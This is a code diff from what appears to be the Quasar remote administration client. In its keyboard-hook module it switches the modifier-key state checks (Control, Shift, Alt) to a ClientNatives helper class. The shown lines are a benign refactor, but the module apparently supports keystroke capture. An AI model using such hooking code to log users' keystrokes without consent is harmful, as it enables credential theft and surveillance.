@@ -7,6 +7,7 @@ using System.Runtime.InteropServices;
 using System.Windows.Forms;
 using Quasar.Client.MouseKeyHook.Implementation;
 using Quasar.Client.MouseKeyHook.WinApi;
+using Quasar.Client.Utilities;
 
 namespace Quasar.Client.MouseKeyHook
 {
@@ -123,17 +124,17 @@ namespace Quasar.Client.MouseKeyHook
         // A shortcut to make life easier
         private static bool CheckModifier(int vKey)
         {
-            return (KeyboardNativeMethods.GetKeyState(vKey) & 0x8000) > 0;
+            return (ClientNatives.GetKeyState(vKey) & 0x8000) > 0;
         }
 
         private static Keys AppendModifierStates(Keys keyData)
         {
             // Is Control being held down?
-            var control = CheckModifier(KeyboardNativeMethods.VK_CONTROL);
+            var control = CheckModifier(ClientNatives.VK_CONTROL);
             // Is Shift being held down?
-            var shift = CheckModifier(KeyboardNativeMethods.VK_SHIFT);
+            var shift = CheckModifier(ClientNatives.VK_SHIFT);
             // Is Alt being held down?
-            var alt = CheckModifier(KeyboardNativeMethods.VK_MENU);
+            var alt = CheckModifier(ClientNatives.VK_MENU);
 
             // Windows keys
             // # combine LWin and RWin key with other keys will potentially corrupt the data
